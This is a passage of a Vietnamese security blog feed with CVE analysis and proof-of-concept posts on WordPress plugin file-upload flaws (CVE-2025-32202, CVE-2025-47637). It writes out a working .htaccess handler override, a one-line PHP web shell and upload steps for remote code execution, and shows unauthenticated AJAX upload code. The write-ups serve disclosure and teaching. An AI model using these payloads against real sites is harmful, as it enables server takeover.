&lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo cấu trúc thư mục sau:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bypass&#xA;.&#xA;├── .htaccess&#xA;├── index.html&#xA;└── rce.abc&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;    &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;        SetHandler application/x-httpd-php&#xA;    &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tạo rule, có thể upload file &lt;code&gt;.abc&lt;/code&gt; trong thư mục hiện tại và thư mục con. Khiến nó thực thi như file &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;rce.abc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Chứa web shell&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Nén thư mục lại thành file &lt;code&gt;.zip&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip -r bypass.zip bypass&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Upload file zip vừa tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#34; title=&#34;Widget của plugin trong tạo post&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;e-Elearning&lt;/h2&gt;&lt;p&gt;Widget của plugin trong tạo post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#39; alt=&#34;e-Elearning&#34; height=&#34;542&#34; width=&#34;1401&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget của plugin trong tạo post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Đây là chức năng được môt tả trong document của plugin, ta tạo post rồi thêm widget này sau đó thực hiện upload zip file&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#34; title=&#34;Widget e-Elearning&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/block.png&#34; data-sub-html=&#34;&lt;h2&gt;Block&lt;/h2&gt;&lt;p&gt;Widget e-Elearning&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#39; alt=&#34;Block&#34; height=&#34;189&#34; width=&#34;348&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget e-Elearning&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Request và Response trong BurpSuite:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; title=&#34;Request và Response trong BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; data-sub-html=&#34;&lt;h2&gt;Request và Response trong BurpSuite&lt;/h2&gt;&lt;p&gt;Request và Response trong BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#39; alt=&#34;Request và Response trong BurpSuite&#34; height=&#34;580&#34; width=&#34;1895&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request và Response trong BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;RCE với web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#39; alt=&#34;Result&#34; height=&#34;580&#34; width=&#34;1305&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-32202&lt;/strong&gt; phát sinh do plugin &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; kiểm tra không đầy đủ loại file được giải nén, bỏ sót trường hợp &lt;code&gt;.htaccess&lt;/code&gt;. Điều này cho phép attacker có quyền &lt;strong&gt;Editor&lt;/strong&gt; tải lên một file &lt;code&gt;.htaccess&lt;/code&gt; để ghi đè cơ chế xử lý file trong thư mục upload. Kết quả là các file được tải lên sau đó, dù có phần mở rộng tùy ý (như &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xyz&lt;/code&gt;), vẫn có thể được xử lý như file PHP, dẫn đến &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&#xA;Bản vá &lt;strong&gt;4.3000000026&lt;/strong&gt; đã bổ sung kiểm tra đối với &lt;code&gt;.htaccess&lt;/code&gt;, ngăn chặn việc ghi đè handler trong thư mục upload và loại bỏ khả năng khai thác này.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cần kiểm tra chặt chẽ mọi loại file có thể ảnh hưởng đến hành vi máy chủ, đặc biệt là &lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Không chỉ dựa vào phần mở rộng file; cần xác thực cả MIME type và nội dung thực tế của file.&lt;/li&gt;&#xA;&lt;li&gt;Không nên cho phép người dùng, kể cả tài khoản có quyền Editor, tải lên file nén chứa nội dung có thể thực thi.&lt;/li&gt;&#xA;&lt;li&gt;Cần tách biệt rõ ràng thư mục upload của người dùng khỏi thư mục có thể thực thi PHP.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên kiểm tra và cập nhật plugin; các lỗi nhỏ trong cơ chế lọc file có thể dẫn tới RCE nghiêm trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/insert-or-embed-articulate-content-into-wordpress/vulnerability/wordpress-insert-or-embed-articulate-content-into-wordpress-plugin-4-3000000025-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Insert or Embed Articulate Content into WordPress Plugin &amp;lt;= 4.3000000025 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47637 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong plugin &lt;strong&gt;STAGGS&lt;/strong&gt; cho phép kẻ tấn công tải lên &lt;strong&gt;Web Shell&lt;/strong&gt; lên máy chủ web, ảnh hưởng đến các phiên bản &lt;strong&gt;STAGGS từ n/a đến 2.11.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47637&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47637&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.12.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/staggs/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;STAGGS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.11.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.12.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra trong hàm &lt;code&gt;store_final_product_image()&lt;/code&gt; thuộc file &lt;code&gt;/wp-content/plugins/staggs/includes/staggs-functions.php&lt;/code&gt; do không xác thực &lt;strong&gt;file type&lt;/strong&gt; trước khi upload&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#34; title=&#34;Xác thực file type&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;Xác thực file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Xác thực file type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã sử dụng while list, chỉ chấp nhận các loại file: &lt;code&gt;png&lt;/code&gt;,&lt;code&gt;jpg&lt;/code&gt;,&lt;code&gt;jpeg&lt;/code&gt;,&lt;code&gt;gif&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook dành cho người dùng chưa đăng nhập (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_staggs_get_configuration_form_urls&amp;#39;, &amp;#39;staggs_get_configuration_form_urls_ajax&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=staggs_get_configuration_form_urls&lt;/code&gt; thì callback &lt;code&gt;staggs_get_configuration_form_urls_ajax&lt;/code&gt; được gọi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function staggs_get_configuration_form_urls_ajax() {&#xA;  $response = array();&#xA;  if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( $_REQUEST[&amp;#39;nonce&amp;#39;], &amp;#39;sgg_ajax_nonce&amp;#39; ) ) {&#xA;    echo json_encode( $response );&#xA;    die();&#xA;  }&#xA;  ...&#xA;  if ( isset( $_POST[&amp;#39;image_id&amp;#39;] ) ) {&#xA;    $image_name = staggs_sanitize_title( get_the_title( $_POST[&amp;#39;image_id&amp;#39;] ) ); // image name based on product title.&#xA;    $image_url  = store_final_product_image( $image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true );&#xA;&#xA;    $response[&amp;#39;image_url&amp;#39;] = $image_url;&#xA;  }&#xA;  ...&#xA;  echo json_encode( $response );&#xA;  die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này kiểm tra &lt;code&gt;nonce&lt;/code&gt; từ request, nếu nó không tồn tại hoặc không hợp lệ thì trả về response rỗng&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Khi tìm kiếm với từ khóa &lt;code&gt;sgg_ajax_nonce&lt;/code&gt;, ta thấy &lt;code&gt;nonce&lt;/code&gt; được tạo bằng key &lt;code&gt;AJAX_NONCE&lt;/code&gt; và có comment &lt;code&gt;// image name based on product title.&lt;/code&gt; liên quan đến product. Do phần này không yêu cầu xác thực, có thể đây là cơ chế phục vụ việc hiển thị product cho người dùng chưa đăng nhập, và &lt;code&gt;nonce&lt;/code&gt; được chèn trực tiếp vào mã nguồn.&#xA;Khi thử tính năng tạo product của plugin, hệ thống tạo một post mà người dùng chưa đăng nhập vẫn có thể truy cập.&#xA;&lt;code&gt;nonce&lt;/code&gt; này xuất hiện trong mã nguồn trả về khi truy cập product vừa được tạo.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; title=&#34;Cách nonce được tạo&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Cách nonce được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;327&#34; width=&#34;1369&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách nonce được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#34; 